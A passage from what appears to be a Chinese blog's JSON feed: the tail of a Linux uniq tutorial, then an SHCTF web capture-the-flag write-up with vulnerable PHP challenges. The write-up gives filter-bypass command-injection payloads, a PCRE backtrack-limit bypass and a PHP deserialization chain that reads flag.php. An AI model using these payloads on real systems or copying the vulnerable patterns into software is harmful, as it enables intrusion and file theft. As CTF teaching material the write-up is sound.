<span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Linux <span class=\"token number\">85</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Linux <span class=\"token number\">85</span></pre></td></tr></table></figure><p>使用 uniq 命令删除重复的行后，有如下输出结果：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">uniq</span> testfile     <span class=\"token comment\">#删除重复行后的内容  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux <span class=\"token number\">85</span></pre></td></tr></table></figure><p>检查文件并删除文件中重复出现的行，并在行首显示该行重复出现的次数。使用如下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uniq</span> <span class=\"token parameter variable\">-c</span> testfile</pre></td></tr></table></figure><p>结果输出如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">uniq</span> <span class=\"token parameter variable\">-c</span> testfile      <span class=\"token comment\">#删除重复行后的内容  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">3</span> <span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>             <span class=\"token comment\">#前面的数字的意义为该行共出现了 3 次  </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">4</span> Hello <span class=\"token number\">95</span>            <span class=\"token comment\">#前面的数字的意义为该行共出现了 4 次  </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">2</span> Linux <span class=\"token number\">85</span>            <span class=\"token comment\">#前面的数字的意义为该行共出现了 2 次</span></pre></td></tr></table></figure><p>当重复的行并不相邻时，uniq 命令是不起作用的，即若文件内容为以下时，uniq 命令不起作用：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile1      <span class=\"token comment\"># 原有内容 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux <span class=\"token number\">85</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Linux <span class=\"token number\">85</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Linux <span class=\"token number\">85</span></pre></td></tr></table></figure><p>这时我们就可以使用 sort：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sort</span>  testfile1 <span class=\"token operator\">|</span> <span class=\"token function\">uniq</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Linux <span class=\"token number\">85</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span></pre></td></tr></table></figure><p>统计各行在文件中出现的次数：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sort</span> testfile1 <span class=\"token operator\">|</span> <span class=\"token function\">uniq</span> <span class=\"token parameter variable\">-c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token number\">3</span> Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token number\">3</span> Linux <span class=\"token number\">85</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token number\">3</span> <span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span></pre></td></tr></table></figure><p>在文件中找出重复的行：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sort</span> testfile1 <span class=\"token operator\">|</span> <span class=\"token function\">uniq</span> <span class=\"token parameter variable\">-d</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Linux <span class=\"token number\">85</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span></pre></td></tr></table></figure>",
            "tags": [
                "杂谈小记",
                "php是世界上最好的语言",
                "反序列化好难呜呜"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/SHCTF/",
            "url": "https://p1kap1.github.io/CTF/web/SHCTF/",
            "title": "SHCTF-WP",
            "date_published": "2023-11-01T16:00:00.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"week1babyrce\"><a class=\"anchor\" href=\"#week1babyrce\">#</a> [WEEK1]babyRCE</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$rce</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'rce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\>|\\&lt;|\\'|\\\"/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$rce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hhhhhhacker!!!\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤了很多，不过像 cat 这样类似读取文件的命令，都可以通过采用这种形式：c\\at，来绕过过滤，或者可以使用 uniq 命令来读取，关于 uniq 命令可以查看这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLXVuaXEuaHRtbA==\">Linux uniq 命令</span></p>\n<p>空格被过滤了，可以利用 %09 或者 $IFS 来绕过过滤。</p>\n<p>payload：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?rce=ls<span class=\"token placeholder selector\">%09</span>/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/?rce=c\\at<span class=\"token placeholder selector\">%09</span>/fl??</pre></td></tr></table></figure><h3 id=\"week11zzphp\"><a class=\"anchor\" href=\"#week11zzphp\">#</a> [WEEK1]1zzphp</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./index.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c_ode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c_ode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/.+?SHCTF/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'no touch!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'2023SHCTF'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'what do you want'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>分析源码，第一步需要给 num 传参，但不能为数字，但是后面的 intval 函数又要求必须是数字，所以采用传数组绕过。</p>\n<p>由于使用 string () 函数将传入的参数 c_ode 转化为字符串，所以不能使用数组绕过正则，但 <code>pcre.backtrack_limit</code>  给 pcre 设定了一个回溯次数上限，默认为 1000000，如果回溯次数超过这个数字，preg_match 会返回 false</p>\n<p>具体可以参考 p 神的博客：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\">PHP 利用 PCRE 回溯次数限制绕过某些安全限制</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'haha'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'250000'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'2023SHCTF'</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">2023SHCTFGET</span><span class=\"token punctuation\">:</span>num[]=1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token property\">Post</span><span class=\"token punctuation\">:</span>c_ode=<span class=\"token function\">hahaha</span><span class=\"token punctuation\">(</span>......<span class=\"token punctuation\">)</span>2023SHCTF</pre></td></tr></table></figure><h3 id=\"week1ez_serialize\"><a class=\"anchor\" href=\"#week1ez_serialize\">#</a> [WEEK1]ez_serialize</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token variable\">$var_1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var_1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token variable\">$q</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">q</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span>           </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">C</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token variable\">$z</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">z</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">D</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>直接上链子：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var_1</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$q</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">C</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$z</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">D</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">q</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">q</span><span class=\"token operator\">-></span><span class=\"token property\">z</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">D</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">q</span><span class=\"token operator\">-></span><span class=\"token property\">z</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>？payload=O%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22q%22%3BO%3A1%3A%22C%22%3A2%3A%7Bs%3A3%3A%22var%22%3BN%3Bs%3A1%3A%22z%22%3BO%3A1%3A%22D%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A5%3A%22var_1%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D%7D</p>\n</blockquote>\n<p>得到后 base64 解码即可。</p>\n<h3 id=\"week1登录就给flag\"><a class=\"anchor\" href=\"#week1登录就给flag\">#</a> [WEEK1] 登录就给 flag</h3>\n<p>点击登录，等待 3 秒，跳转到登录页面，尝试弱口令 admin 和 password，登录成功</p>\n<h3 id=\"week1飞机大战\"><a class=\"anchor\" href=\"#week1飞机大战\">#</a> [WEEK1] 飞机大战</h3>\n<p>简单的前端 js 代码审计，提示分数大于 99999 就能拿到 flag 哦。</p>\n<p>两种思路，一种是直接找 flag，另一种是修改分数。</p>\n<p>可以在 main.js 中找到 won 函数：</p>\n<figure class=\"highlight 